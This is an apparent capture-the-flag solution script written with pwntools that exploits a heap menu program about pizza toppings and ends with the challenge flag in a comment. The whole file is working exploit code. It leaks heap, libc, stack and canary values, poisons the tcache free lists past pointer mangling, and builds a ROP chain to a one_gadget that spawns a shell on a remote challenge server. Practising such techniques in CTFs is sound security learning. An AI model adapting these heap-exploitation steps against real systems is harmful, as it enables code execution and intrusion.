#!/usr/bin/env python3
from pwn import *
# helper
def str2hex(str):
    return int('0x' + str.encode()[::-1].hex(), 16)

context.terminal = 'wt.exe sp -d . wsl.exe -d Ubuntu'.split()
context.arch = 'amd64'
conn = 'nc 34.70.212.151 8007'.split()
host, port = conn[1], int(conn[2])
e = ELF('./chal_patched')
lib = ELF('./libc.so.6', checksec=False)

script = """
brva 0x000000000001B71
brva 0x000000000001659
brva 0x00000000000181F
brva 0x000000000001B4F
brva 0x0000000000171C
brva 0x0000000000014DD
c
"""

if args.REMOTE:
    p = remote(host, port)
elif args.GDB:
    p = gdb.debug(e.path, gdbscript=script, aslr=True)
else:
    p = process(e.path)

def new(n, top=b'Tomato'):
    p.sendlineafter(b': ', b'1')
    p.sendlineafter(b'Which topping ?\n', top)
    p.sendlineafter(b'How much ?\n', str(n).encode())
    
def edit(top, new_top):
    p.sendlineafter(b': ', b'2')
    p.sendlineafter(b'Which one to customize ?\n', top)
    p.sendafter(b': ', new_top)
        
def free(top):
    p.sendlineafter(b': ', b'3')
    p.sendlineafter(b"Which topping to remove ?\n", top)
    
def show(top):
    p.sendlineafter(b': ', b'4')
    p.sendlineafter(b"Which topping to verify ?\n", top)
    
def free_all():
    p.sendlineafter(b': ', b'5')
    
def fd(target, chunk):
    return p64(target ^ (chunk >> 12))
    

top = [b'']*10
top[0] = b"Tomato"
top[1] = b"Onion"
top[2] = b"Capsicum"
top[3] = b"Corn"
top[4] = b"Mushroom"
top[5] = b"Pineapple"
top[6] = b"Olives"
top[7] = b"Double Cheese"
top[8] = b"Paneer"
top[9] = b"Chicken"    

new(1, top[0])
free(top[0])
show(top[0])
heap = u64(p.recv(5) + b'\x00'*3)
heap = heap << 12
info("heap: " + hex(heap))

for i in range(7):
    new(20, top[i])
new(20, top[7])
new(1, top[8])
new(1, top[8])
for i in range(7):
    free(top[i])
free(top[7])
show(top[7])
lib.address = u64(p.recv(6) + b'\x00'*2) - 0x219ce0
info("lib.address: " + hex(lib.address))

for i in range(8):
    new(20, top[0])
for i in range(3):
    new(1, top[i])
for i in range(3):
    free(top[i])
new(1, top[0])
free(top[2])
chunk = heap + (0x562fe30c36e8-0x562fe30c3000)
edit(top[0], fd(lib.sym.environ, chunk))
new(1, top[0])
new(1, top[0])
show(top[0])
stack = u64(p.recv(6) + b'\x00'*2)
info("stack: " + hex(stack))

ret_addr = stack + (0x7ffe4e057dd8-0x7ffe4e057ff8)-0x18
tcache = heap + (0x55584061f010-0x55584061f000)
canary_ptr = stack + (0x7ffd18386708-0x7ffd18386798)-0x18
print(hex(canary_ptr))
for i in range(3):
    new(30, top[i])
for i in range(3):
    free(top[i])
new(30, top[0])
free(top[2])
chunk = heap + (0x5591723f1a00-0x5591723f1000)
edit(top[0], fd(tcache, chunk))
new(30, top[0])
new(30, top[0])
tcache_struct = p64(0x100000001) + p64(0) + p64(3)
tcache_struct = tcache_struct.ljust(0x90, b'\x00') + p64(canary_ptr)
tcache_struct = tcache_struct.ljust(0xc0, b'\x00') + p64(ret_addr)
edit(top[0], tcache_struct)

new(6, top[1])
edit(top[1], b'a'*0x16 + b'zzz')
show(top[1])
p.recvuntil(b'zzz')
canary = u64(b'\x00' + p.recv(7))
info("canary: " + hex(canary))

new(19, top[1])
# gdb.attach(p, gdbscript=script)
# pause()
one_gadget = 0xebc88+lib.address
rsi = 0x001baf97+lib.address
rdx = 0x000796a2+lib.address
rbp = 0x001bb980+lib.address
rop = [rsi, 0, rdx, 0, rbp, lib.bss(), one_gadget]
payload = p64(0) + p64(canary) + p64(0) + b''.join(map(p64, rop))
edit(top[1], payload)


p.interactive()

# flag{n3v3r_h4v3_1_3v3r_h4d_p1n3app13_0n_p1zz4}